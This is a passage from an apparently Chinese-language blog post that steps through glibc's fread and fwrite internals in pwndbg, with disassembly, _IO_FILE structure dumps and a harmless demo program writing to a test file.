&lt;+410&gt;:   je     0x7ffff7c8cc56 &lt;_IO_new_file_underflow+422&gt;</span><br><span class="line">   0x00007ffff7c8cc4c &lt;+412&gt;:   add    rdx,rax</span><br><span class="line">   0x00007ffff7c8cc4f &lt;+415&gt;:   mov    QWORD PTR [rbx+0x90],rdx</span><br><span class="line">   0x00007ffff7c8cc56 &lt;+422&gt;:   mov    rax,QWORD PTR [rbx+0x8]</span><br><span class="line">   0x00007ffff7c8cc5a &lt;+426&gt;:   movzx  eax,BYTE PTR [rax]</span><br><span class="line">   0x00007ffff7c8cc5d &lt;+429&gt;:   add    rsp,0x18</span><br><span class="line">   0x00007ffff7c8cc61 &lt;+433&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c8cc62 &lt;+434&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c8cc63 &lt;+435&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c8cc65 &lt;+437&gt;:   pop    r13</span><br><span class="line">   0x00007ffff7c8cc67 &lt;+439&gt;:   pop    r14</span><br><span class="line">   0x00007ffff7c8cc69 &lt;+441&gt;:   pop    r15</span><br><span class="line">   0x00007ffff7c8cc6b &lt;+443&gt;:   ret</span><br><span class="line">   0x00007ffff7c8cc6c &lt;+444&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c8cc70 &lt;+448&gt;:   movzx  eax,BYTE PTR [rdx]</span><br><span class="line">   0x00007ffff7c8cc73 &lt;+451&gt;:   add    rsp,0x18</span><br><span class="line">   0x00007ffff7c8cc77 &lt;+455&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c8cc78 &lt;+456&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c8cc79 &lt;+457&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c8cc7b &lt;+459&gt;:   pop    r13</span><br><span class="line">   0x00007ffff7c8cc7d &lt;+461&gt;:   pop    r14</span><br><span class="line">   0x00007ffff7c8cc7f &lt;+463&gt;:   pop    r15</span><br><span class="line">   0x00007ffff7c8cc81 &lt;+465&gt;:   ret</span><br><span class="line">   0x00007ffff7c8cc82 &lt;+466&gt;:   nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8cc88 &lt;+472&gt;:   mov    QWORD PTR [rbx+0x90],0xffffffffffffffff</span><br><span class="line">   0x00007ffff7c8cc93 &lt;+483&gt;:   mov    edx,DWORD PTR [rbx]</span><br><span class="line">   0x00007ffff7c8cc95 &lt;+485&gt;:   mov    ecx,edx</span><br><span class="line">   0x00007ffff7c8cc97 &lt;+487&gt;:   or     edx,0x20</span><br><span class="line">   0x00007ffff7c8cc9a &lt;+490&gt;:   or     ecx,0x10</span><br><span class="line">   0x00007ffff7c8cc9d &lt;+493&gt;:   test   rax,rax</span><br><span class="line">   0x00007ffff7c8cca0 &lt;+496&gt;:   mov    eax,0xffffffff</span><br><span class="line">   0x00007ffff7c8cca5 &lt;+501&gt;:   cmove  edx,ecx</span><br><span class="line">   0x00007ffff7c8cca8 &lt;+504&gt;:   mov    DWORD PTR [rbx],edx</span><br><span class="line">   0x00007ffff7c8ccaa &lt;+506&gt;:   add    rsp,0x18</span><br><span class="line">   0x00007ffff7c8ccae &lt;+510&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c8ccaf &lt;+511&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c8ccb0 &lt;+512&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c8ccb2 &lt;+514&gt;:   pop    r13</span><br><span class="line">   0x00007ffff7c8ccb4 &lt;+516&gt;:   pop    r14</span><br><span class="line">   0x00007ffff7c8ccb6 &lt;+518&gt;:   pop    r15</span><br><span class="line">   0x00007ffff7c8ccb8 &lt;+520&gt;:   ret</span><br><span class="line">   0x00007ffff7c8ccb9 &lt;+521&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c8ccc0 &lt;+528&gt;:   mov    rdi,QWORD PTR [rdi+0x48]</span><br><span class="line">   0x00007ffff7c8ccc4 &lt;+532&gt;:   test   rdi,rdi</span><br><span class="line">   0x00007ffff7c8ccc7 &lt;+535&gt;:   je     0x7ffff7c8ccd4 &lt;_IO_new_file_underflow+548&gt;</span><br><span class="line">   0x00007ffff7c8ccc9 &lt;+537&gt;:   call   0x7ffff7c28370 &lt;free@plt&gt;</span><br><span class="line">   0x00007ffff7c8ccce &lt;+542&gt;:   and    DWORD PTR [rbx],0xfffffeff</span><br><span class="line">   0x00007ffff7c8ccd4 &lt;+548&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8ccd7 &lt;+551&gt;:   call   0x7ffff7c8dc90 &lt;__GI__IO_doallocbuf&gt;</span><br><span class="line">   0x00007ffff7c8ccdc &lt;+556&gt;:   mov    eax,DWORD PTR [rbx]</span><br><span class="line">   0x00007ffff7c8ccde &lt;+558&gt;:   test   eax,0x202</span><br><span class="line">   0x00007ffff7c8cce3 &lt;+563&gt;:   jne    0x7ffff7c8cafb &lt;_IO_new_file_underflow+75&gt;</span><br><span class="line">   0x00007ffff7c8cce9 &lt;+569&gt;:   jmp    0x7ffff7c8cbd2 &lt;_IO_new_file_underflow+290&gt;</span><br><span class="line">   0x00007ffff7c8ccee &lt;+574&gt;:   xchg   ax,ax</span><br><span class="line">   0x00007ffff7c8ccf0 &lt;+576&gt;:   mov    r8,r12</span><br><span class="line">   0x00007ffff7c8ccf3 &lt;+579&gt;:   jmp    0x7ffff7c8cb59 &lt;_IO_new_file_underflow+169&gt;</span><br><span class="line">   0x00007ffff7c8ccf8 &lt;+584&gt;:   nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8cd00 &lt;+592&gt;:   mov    r8,r12</span><br><span class="line">   0x00007ffff7c8cd03 &lt;+595&gt;:   mov    rax,QWORD PTR [r8+0xd8]</span><br><span class="line">   0x00007ffff7c8cd0a &lt;+602&gt;:   lea    r15,[rip+0x18aa57]        # 0x7ffff7e17768</span><br><span class="line">   0x00007ffff7c8cd11 &lt;+609&gt;:   lea    rbp,[rip+0x189ce8]        # 0x7ffff7e16a00 &lt;_IO_helper_jumps&gt;</span><br><span class="line">   0x00007ffff7c8cd18 &lt;+616&gt;:   mov    r13,r15</span><br><span class="line">   0x00007ffff7c8cd1b &lt;+619&gt;:   mov    r14,rbp</span><br><span class="line">   0x00007ffff7c8cd1e &lt;+622&gt;:   mov    QWORD PTR [rsp+0x8],rax</span><br><span class="line">   0x00007ffff7c8cd23 &lt;+627&gt;:   sub    r13,rbp</span><br><span class="line">   0x00007ffff7c8cd26 &lt;+630&gt;:   sub    rax,rbp</span><br><span class="line">   0x00007ffff7c8cd29 &lt;+633&gt;:   cmp    r13,rax</span><br><span class="line">   0x00007ffff7c8cd2c &lt;+636&gt;:   jbe    0x7ffff7c8cd60 &lt;_IO_new_file_underflow+688&gt;</span><br><span class="line">   0x00007ffff7c8cd2e &lt;+638&gt;:   mov    rax,QWORD PTR [rsp+0x8]</span><br><span class="line">   0x00007ffff7c8cd33 &lt;+643&gt;:   mov    esi,0xffffffff</span><br><span class="line">   0x00007ffff7c8cd38 &lt;+648&gt;:   mov    rdi,r8</span><br><span class="line">   0x00007ffff7c8cd3b &lt;+651&gt;:   call   QWORD PTR [rax+0x18]</span><br><span class="line">   0x00007ffff7c8cd3e &lt;+654&gt;:   jmp    0x7ffff7c8cb86 &lt;_IO_new_file_underflow+214&gt;</span><br><span class="line">   0x00007ffff7c8cd43 &lt;+659&gt;:   nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8cd48 &lt;+664&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br><span class="line">   0x00007ffff7c8cd4d &lt;+669&gt;:   mov    rsi,QWORD PTR [rbx+0x38]</span><br><span class="line">   0x00007ffff7c8cd51 &lt;+673&gt;:   jmp    0x7ffff7c8cc29 &lt;_IO_new_file_underflow+377&gt;</span><br><span class="line">   0x00007ffff7c8cd56 &lt;+678&gt;:   cs nop WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8cd60 &lt;+688&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br><span class="line">   0x00007ffff7c8cd65 &lt;+693&gt;:   mov    rax,QWORD PTR [rip+0x18d0cc]        # 0x7ffff7e19e38</span><br><span class="line">   0x00007ffff7c8cd6c &lt;+700&gt;:   mov    r8,QWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c8cd6f &lt;+703&gt;:   jmp    0x7ffff7c8cd2e &lt;_IO_new_file_underflow+638&gt;</span><br><span class="line">   0x00007ffff7c8cd71 &lt;+705&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c8cd78 &lt;+712&gt;:   call   0x7ffff7c91230 &lt;__GI___lll_lock_wait_private&gt;</span><br><span class="line">   0x00007ffff7c8cd7d &lt;+717&gt;:   jmp    0x7ffff7c8cb40 &lt;_IO_new_file_underflow+144&gt;</span><br><span class="line">   0x00007ffff7c8cd82 &lt;+722&gt;:   nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8cd88 &lt;+728&gt;:   mov    eax,0xffffffff</span><br><span class="line">   0x00007ffff7c8cd8d &lt;+733&gt;:   ret</span><br><span class="line">   0x00007ffff7c8cd8e &lt;+734&gt;:   xchg   ax,ax</span><br><span class="line">   0x00007ffff7c8cd90 &lt;+736&gt;:   or     eax,0x20</span><br><span class="line">   0x00007ffff7c8cd93 &lt;+739&gt;:   mov    DWORD PTR [rdi],eax</span><br><span class="line">   0x00007ffff7c8cd95 &lt;+741&gt;:   mov    rax,QWORD PTR [rip+0x18d074]        # 0x7ffff7e19e10</span><br><span class="line">   0x00007ffff7c8cd9c &lt;+748&gt;:   mov    DWORD PTR fs:[rax],0x9</span><br><span class="line">   0x00007ffff7c8cda3 &lt;+755&gt;:   mov    eax,0xffffffff</span><br><span class="line">   0x00007ffff7c8cda8 &lt;+760&gt;:   jmp    0x7ffff7c8cc5d &lt;_IO_new_file_underflow+429&gt;</span><br><span class="line">   0x00007ffff7c8cdad &lt;+765&gt;:   endbr64</span><br><span class="line">   0x00007ffff7c8cdb1 &lt;+769&gt;:   mov    rbp,rax</span><br><span class="line">   0x00007ffff7c8cdb4 &lt;+772&gt;:   jmp    0x7ffff7c2984e &lt;_IO_new_file_underflow.cold&gt;</span><br><span class="line">Address range 0x7ffff7c2984e to 0x7ffff7c29887:</span><br><span class="line">   0x00007ffff7c2984e &lt;-406114&gt;:        test   DWORD PTR [r12],0x8000</span><br><span class="line">   0x00007ffff7c29856 &lt;-406106&gt;:        jne    0x7ffff7c2987f &lt;_IO_new_file_underflow-406065&gt;</span><br><span class="line">   0x00007ffff7c29858 &lt;-406104&gt;:        mov    rdi,QWORD PTR [r12+0x88]</span><br><span class="line">   0x00007ffff7c29860 &lt;-406096&gt;:        mov    eax,DWORD PTR [rdi+0x4]</span><br><span class="line">   0x00007ffff7c29863 &lt;-406093&gt;:        sub    eax,0x1</span><br><span class="line">   0x00007ffff7c29866 &lt;-406090&gt;:        mov    DWORD PTR [rdi+0x4],eax</span><br><span class="line">   0x00007ffff7c29869 &lt;-406087&gt;:        jne    0x7ffff7c2987f &lt;_IO_new_file_underflow-406065&gt;</span><br><span class="line">   0x00007ffff7c2986b &lt;-406085&gt;:        mov    QWORD PTR [rdi+0x8],0x0</span><br><span class="line">   0x00007ffff7c29873 &lt;-406077&gt;:        xchg   DWORD PTR [rdi],eax</span><br><span class="line">   0x00007ffff7c29875 &lt;-406075&gt;:        sub    eax,0x1</span><br><span class="line">   0x00007ffff7c29878 &lt;-406072&gt;:        jle    0x7ffff7c2987f &lt;_IO_new_file_underflow-406065&gt;</span><br><span class="line">   0x00007ffff7c2987a &lt;-406070&gt;:        call   0x7ffff7c91300 &lt;__GI___lll_lock_wake_private&gt;</span><br><span class="line">   0x00007ffff7c2987f &lt;-406065&gt;:        mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c29882 &lt;-406062&gt;:        call   0x7ffff7c2a120 &lt;_Unwind_Resume&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p><code>vtable-&gt;_IO_file_underflow</code>函数主体是先检查缓冲区，如果<code>fp-&gt;_IO_buf_base</code> &#x3D;&#x3D; <code>NULL</code>则调用<code>_IO_doallocbuf</code>来分配缓冲区，然后系统调用<code>read</code>读取数据到缓冲区，然后根据需要读取的数据调整读写指针<br>发现这里<code>_IO_file_underflow</code>还会调用<code>_IO_switch_to_get_mode </code>函数来切换文件模式为读（<code>_mode</code>&#x3D;-1）并清空对应指针防止干扰<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8cbed &lt;_IO_file_underflow+317&gt;    mov    rdi, rbx                  RDI =&gt; 0x5555555592a0 ◂— 0xfbad2488</span><br><span class="line">0x7ffff7c8cbf0 &lt;_IO_file_underflow+320&gt;    call   _IO_switch_to_get_mode      &lt;_IO_switch_to_get_mode&gt;</span><br></pre></td></tr></table></figure><p>后续回到<code>_IO_file_underflow</code>函数，设置读写指针，如下所示，都设置为了<code>fp-&gt;_IO_buf_base</code><br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0</span><br><span class="line">$3 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539000,</span><br><span class="line">    _IO_read_ptr = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_read_end = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_read_base = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_write_base = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_write_ptr = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_write_end = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_buf_base = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_buf_end = 0x55555555a4b0 &quot;&quot;,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后<code>_IO_file_underflow</code>调用<code>vtable-&gt;_IO_file_read</code>（位于<code>_IO_file_jumps</code>+0x70）<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8cc29 &lt;_IO_file_underflow+377&gt;    mov    rdx, qword ptr [rbx + 0x40]        RDX, [0x5555555592e0] =&gt; 0x55555555a4b0 ◂— 0</span><br><span class="line">0x7ffff7c8cc2d &lt;_IO_file_underflow+381&gt;    mov    rdi, rbx                           RDI =&gt; 0x5555555592a0 ◂— 0xfbad2488</span><br><span class="line">0x7ffff7c8cc30 &lt;_IO_file_underflow+384&gt;    sub    rdx, rsi                           RDX =&gt; 0x1000 (0x55555555a4b0 - 0x5555555594b0)</span><br><span class="line">0x7ffff7c8cc33 &lt;_IO_file_underflow+387&gt;    call   qword ptr [rbp + 0x70]      &lt;_IO_file_read&gt;</span><br></pre></td></tr></table></figure><p>然后再系统调用read函数，将文件数据读入<code>fp-&gt;_IO_buf_base</code>（最多读0x1000，即<code>_IO_buf_end</code> - <code>_IO_buf_base</code>）<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8b93c &lt;_IO_file_read+12&gt;    mov    edi, r8d                        EDI =&gt; 3</span><br><span class="line">0x7ffff7c8b93f &lt;_IO_file_read+15&gt;  ✘ jne    _IO_file_read+32            &lt;_IO_file_read+32&gt;</span><br><span class="line"></span><br><span class="line">0x7ffff7c8b941 &lt;_IO_file_read+17&gt;    jmp    read                        &lt;read&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7d147d0 &lt;read&gt;                endbr64</span><br><span class="line">0x7ffff7d147d4 &lt;read+4&gt;              mov    eax, dword ptr fs:[0x18]     EAX, [0x7ffff7fb1758] =&gt; 0</span><br><span class="line">0x7ffff7d147dc &lt;read+12&gt;             test   eax, eax                     0 &amp; 0     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7d147de &lt;read+14&gt;           ✘ jne    read+32                     &lt;read+32&gt;</span><br><span class="line"></span><br><span class="line">0x7ffff7d147e0 &lt;read+16&gt;             syscall  &lt;SYS_read&gt;</span><br><span class="line">───────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure><p>可以看到缓冲区读入的’a’<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x5555555594a0</span><br><span class="line">0x5555555594a0: 0x0000000000000000      0x0000000000001011</span><br><span class="line">0x5555555594b0: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x5555555594c0: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x5555555594d0: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x5555555594e0: 0x00000a6161616161      0x0000000000000000</span><br></pre></td></tr></table></figure><p>最后<code>_IO_file_underflow</code>执行完毕，结构体状态如下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0</span><br><span class="line">$3 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539000,</span><br><span class="line">    _IO_read_ptr = 0x5555555594b0 &#x27;a&#x27; &lt;repeats 53 times&gt;, &quot;\n&quot;,</span><br><span class="line">    _IO_read_end = 0x5555555594e6 &quot;&quot;,</span><br><span class="line">    _IO_read_base = 0x5555555594b0 &#x27;a&#x27; &lt;repeats 53 times&gt;, &quot;\n&quot;,</span><br><span class="line">    _IO_write_base = 0x5555555594b0 &#x27;a&#x27; &lt;repeats 53 times&gt;, &quot;\n&quot;,</span><br><span class="line">    _IO_write_ptr = 0x5555555594b0 &#x27;a&#x27; &lt;repeats 53 times&gt;, &quot;\n&quot;,</span><br><span class="line">    _IO_write_end = 0x5555555594b0 &#x27;a&#x27; &lt;repeats 53 times&gt;, &quot;\n&quot;,</span><br><span class="line">    _IO_buf_base = 0x5555555594b0 &#x27;a&#x27; &lt;repeats 53 times&gt;, &quot;\n&quot;,</span><br><span class="line">    _IO_buf_end = 0x55555555a4b0 &quot;&quot;,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_IO_read_end</code>已调整至读缓冲区结束位置<br>然后回到<code>_IO_file_xsgetn</code>的循环，将缓冲区中的数据读入目标地址，可以粗略看做<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (n &gt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> avail = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">    <span class="keyword">if</span> (avail &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> to_copy = MIN(avail, n);</span><br><span class="line">      <span class="built_in">memcpy</span>(s, fp-&gt;_IO_read_ptr, to_copy);</span><br><span class="line">      fp-&gt;_IO_read_ptr += to_copy;</span><br><span class="line">      s += to_copy;</span><br><span class="line">      n -= to_copy;</span><br><span class="line">      already += to_copy;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 缓冲区已空，调用 refill 函数</span></span><br><span class="line">      <span class="keyword">if</span> (__underflow(fp) == EOF)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>最后fread结束后可以看到数据（20个’a’）已经读入我们的目标地址<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/6gx 0x555555559470</span><br><span class="line">0x555555559470: 0x00007ffff7e170c0      0x0000000000000031</span><br><span class="line">0x555555559480: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x555555559490: 0x0000000061616161      0x0000000000000000</span><br></pre></td></tr></table></figure><h2 id="0x04-fwrite函数"><a href="#0x04-fwrite函数" class="headerlink" title="0x04 fwrite函数"></a>0x04 fwrite函数</h2><p>还是同一个demo，改成fwrite函数即可，其实fwrite的流程和fread是很类似的<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    FILE*fp = fopen(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="type">char</span> *ptr = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr,<span class="string">&quot;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&quot;</span>,<span class="number">0x20</span>);</span><br><span class="line">    fwrite(ptr, <span class="number">1</span>, <span class="number">0x20</span>, fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在fwrite下个断点，发现是<code>_IO_fwrite</code>函数，贴上汇编<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass</span><br><span class="line">Dump of assembler code for function __GI__IO_fwrite:</span><br><span class="line">Address range 0x7ffff7c7ff20 to 0x7ffff7c800a6:</span><br><span class="line">=&gt; 0x00007ffff7c7ff20 